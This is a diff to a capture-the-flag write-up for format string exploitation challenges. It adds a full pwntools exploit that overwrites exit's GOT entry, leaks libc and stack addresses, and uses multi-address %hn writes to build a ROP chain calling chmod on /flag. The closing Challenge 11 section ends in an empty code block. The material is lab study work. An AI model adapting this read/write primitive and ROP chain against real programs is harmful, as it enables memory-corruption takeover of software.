@@ -475,9 +475,42 @@ Can only activate the vuln once. However, partial RELRO and no PIE - hence we'd 
 The only good candidate is `exit`, as it is the only method being called after `printf` (no canary checks, so no `__stack_chk_fail`). 
 
 We can overwrite `exit` to the start address of the program, hence restarting it - giving us the ability to execute the vuln as many times as we wish, now having the ability to leak any values we'd like off the stack. 
-Moreover, we can write content to the stack, and pivoting the frame pointer, so that ROP would be triggered. 
+Moreover, we can write content to the stack, and pivoting the frame pointer, so that ROP would be triggered. \
+Initially, I've implemented generic R/W primitive. The API was a generated format string for every R/W request, as can be seen within `write_addr`. \
+However, each invocation of the primitive opened a new stack frame, as the only legitimate control flow was returning to `func`, hence overwriting stack values. This approach primitive seemed insufficient to exploit (at least easily), as I couldn't write 2 conjecutive qwords near the `RA` within the same stack frame (as `call exit` would overwrite the previously set value).
+
+I've solved this by making the exploit more generic - and allowed writing multiple qwords at completely arbitrary addresses within a single format string invocation, as can be seen within `write_addrs`. 
 
 ```python
+BINARY = glob('/challenge/baby*')[0]
+LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
+GDB_SCRIPT= '''
+set follow-fork-mode child
+b *func+337
+c
+'''
+
+libc = ELF(LIBC)
+binary = ELF(BINARY)
+
+printf_got = binary.got['printf']
+exit_got = binary.got['exit']
+binary_func_addr = binary.symbols['func']
+
+libc_printf_offset = libc.symbols['printf']
+libc_system_offset = libc.symbols['system']
+libc_environ_offset = libc.symbols['environ']
+libc_chmod_offset = libc.symbols['chmod']
+
+binary_rop = ROP(BINARY)
+libc_rop = ROP(LIBC)
+pop_rsp_ret_offset = libc_rop.rsp.address
+pop_rdi_ret_offset = libc_rop.rdi.address
+pop_rsi_ret_offset = libc_rop.rsi.address
+pop_r13_ret_offset = binary_rop.find_gadget(['pop r13']).address
+pop_r13_ret_offset_2 = libc_rop.find_gadget(['pop r13']).address
+leave_ret_offset = libc_rop.find_gadget(['leave']).address
+
 def gen_read_format_string(rsp_to_format_offset, position):
     buf = b''
     buf += b'%' + str(position).encode() + b'$s'
@@ -502,11 +535,11 @@ def read_addr(p, payload_size, rsp_to_format_offset, address):
 
     return leak_addr
 
-def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size):
+def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size, debug):
     buf = b''
 
-    # First trick - trigger a write of 0, of length 8 bytes. That would clear all bits.
-    # buf += b'%' + str(position).encode() + b'$ln'
+    # First trick - trigger a write of 0 (or short prefix string), of length 8 bytes. That would clear most MSBs.
+    buf += b'%' + str(position).encode() + b'$ln'
 
     value_bytes = list(struct.unpack('<HHHH', struct.pack('<Q', value)))
     value_bytes_sorted = sorted(value_bytes)
@@ -515,6 +548,45 @@ def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string
         if val == 0:
             continue
         val_index = value_bytes.index(val)
+        if not debug:
+            if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
+                buf += b'%' + str(val - prefix_string_size).encode() + b'c'
+        else:
+            # Incase of debug, print only 2 padding spaces
+            buf += b'%' + (len(str(val - prefix_string_size).encode()) - 1) * b'0' + b'2' + b'c'
+
+        if debug:
+            # TODO: restore specifier
+            buf += b'%' + str(position + val_index).encode() + b'$lx'
+        else:
+            buf += b'%' + str(position + val_index).encode() + b'$hn'
+        prefix_string_size = val
+        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications
+
+    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))
+
+    return buf
+
+
+def gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size):
+    addrs_count = len(values)
+
+    buf = b''
+    # First trick - trigger a write of 0 (or short prefix string), of length 8 bytes. That would clear most MSBs.
+    for i in range(addrs_count):
+        buf += b'%' + str(position + i * 4).encode() + b'$ln'
+
+    value_bytes = []
+    for value in values:
+        value_bytes += list(struct.unpack('<HHHH', struct.pack('<Q', value)))
+    value_bytes_sorted = sorted(value_bytes)
+
+    for val in value_bytes_sorted:
+        if val == 0:
+            continue
+        val_index = value_bytes.index(val)
+        val_address_index = int(val_index / 4)
+       
         if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
             buf += b'%' + str(val - prefix_string_size).encode() + b'c'
         buf += b'%' + str(position + val_index).encode() + b'$hn'
@@ -526,56 +598,123 @@ def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string
     return buf
 
 
-def write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size = 0):
+def write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size, debug):
     # Notice: there's probably more elegant way to do this. 
     init_position = 6 + int(rsp_to_format_offset / 8)
-    buf = gen_write_format_string(rsp_to_format_offset, init_position, value, prefix_string_size)
+    buf = gen_write_format_string(rsp_to_format_offset, init_position, value, prefix_string_size, debug)
 
     position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
-    buf = gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size)
+    buf = gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size, debug)
 
     buf += struct.pack('<Q', address)
     buf += struct.pack('<Q', address + 2)
     buf += struct.pack('<Q', address + 4)
     buf += struct.pack('<Q', address + 6) 
     
+    if debug:
+        print(f'Generated write buf:{buf}')
+    
     return buf
 
-def write_addr(p, payload_size, rsp_to_format_offset, address, value, prefix_string_size):
-    buf = write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size)
+
+def write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size):
+    # Notice: there's probably more elegant way to do this. 
+    init_position = 6 + int(rsp_to_format_offset / 8)
+    buf = gen_multi_write_format_string(rsp_to_format_offset, init_position, values, prefix_string_size)
+
+    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
+    buf = gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size)
+
+    for address in addresses:
+        buf += struct.pack('<Q', address)
+        buf += struct.pack('<Q', address + 2)
+        buf += struct.pack('<Q', address + 4)
+        buf += struct.pack('<Q', address + 6) 
+
+    print(f'fmt buf:{buf} len:{len(buf)}')
+    
+    return buf
+
+
+def write_addr(p, payload_size, rsp_to_format_offset, address, value, prefix_string_size=0, extra_buffer=b'', debug=False):
+    buf = write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size, debug)
+    buf += extra_buffer
+    buf += (payload_size - len(buf)) * b'A'
+    p.send(buf)
+    p.recvuntil(b'Your input is:')
+
+def write_addrs(p, payload_size, rsp_to_format_offset, addresses, values, prefix_string_size=0):
+    '''
+    This method writes to multiple addresses, within a single format string invocation.
+    '''
+    assert(len(addresses) == len(values))
+    buf = write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size)
     buf += (payload_size - len(buf)) * b'A'
     p.send(buf)
     p.recvuntil(b'Your input is:')
 
 
-
 def main(): 
-    p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
-    # p0 = process(BINARY)
+    # p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    p0 = process(BINARY)
     rsp_to_format_offset = 0x111
     prefix_string_size = 33
+    environ_printf_offset = 0x15d0
 
     payload_size = 0x350
 
+    # Phase 1
     # Overwrite exit's GOT, so we would have infinate invocations.
     # Keep in mind - we have to make sure $rsp remains valid - aligned to 0x10, before calling printf once again. Hence, we would jump to legitimate site - 'func'
     write_addr(p0, payload_size, rsp_to_format_offset, address=exit_got, value=binary_func_addr, prefix_string_size=prefix_string_size)
 
+    # Phase 2
     # Leak libc
     libc_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=printf_got)
     libc_base = libc_leak_addr - libc_printf_offset
-    print(f'libc_base:{hex(libc_base)}')
+    print(f'libc_base: {hex(libc_base)}')
     assert(libc_base & 0xfffffffffffff000 == libc_base)
+    chmod_addr = libc_base + libc_chmod_offset
+    pop_rsp_ret = libc_base + pop_rsp_ret_offset
+    pop_r13_ret_2 = libc_base + pop_r13_ret_offset_2
+    pop_rdi_ret = libc_base + pop_rdi_ret_offset
+    pop_rsi_ret = libc_base + pop_rsi_ret_offset
+    pop_r13_ret = pop_r13_ret_offset
+    leave_ret = libc_base + leave_ret_offset
+    print(f'pop_rsp_ret: {hex(pop_rsp_ret)} pop_r13_ret_2: {hex(pop_r13_ret_2)} pop_rdi_ret: {hex(pop_rdi_ret)} pop_rsi_ret: {hex(pop_rsi_ret)} pop_r13_ret: {hex(pop_r13_ret)} leave_ret: {hex(leave_ret)}')
 
+    # Phase 3 
+    # Leak stack
     # Cute trick, Leak stack using libc leak
     environ_addr = libc_base + libc_environ_offset
     environ_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=environ_addr)
-    print(f'environ_leak_addr:{hex(environ_leak_addr)}')
+    print(f'environ_leak_addr: {hex(environ_leak_addr)}')
 
+    # Phase 4
     # Forge ROP
-    chmod_addr = libc_base + libc_chmod_offset
+    printf_ret_addr = environ_leak_addr - environ_printf_offset
+    flag_addr = printf_ret_addr + 0x30
+    print(f'printf_ret_addr:{hex(printf_ret_addr)}')
+
+    # We'd like to overwrite within a single printf call all 6 qwords, starting from the return address of printf. 
+    write_addrs(p0, payload_size, rsp_to_format_offset, 
+    addresses=[printf_ret_addr, printf_ret_addr + 8, printf_ret_addr + 0x10, printf_ret_addr + 0x18, printf_ret_addr + 0x20, flag_addr], 
+    values=[pop_rdi_ret, flag_addr, pop_rsi_ret, 0xffff, chmod_addr, 0x67616c662f], 
+    prefix_string_size=prefix_string_size)
 
     p0.interactive()
+    
+
+if __name__ == '__main__':
+    main()
 ```
 
+## Challenge 11
 
+Now PIE, but we have 2 invocations. \
+The idea is simple - for the first invocation I'd implement generic multiple-read, which would read PIE, stack and libc addresses within a single format string vuln invocation. 
+For the second invocation, I'd use the generic multiple-write as I've implemented within challenge 10.
+
+```python
+
+```
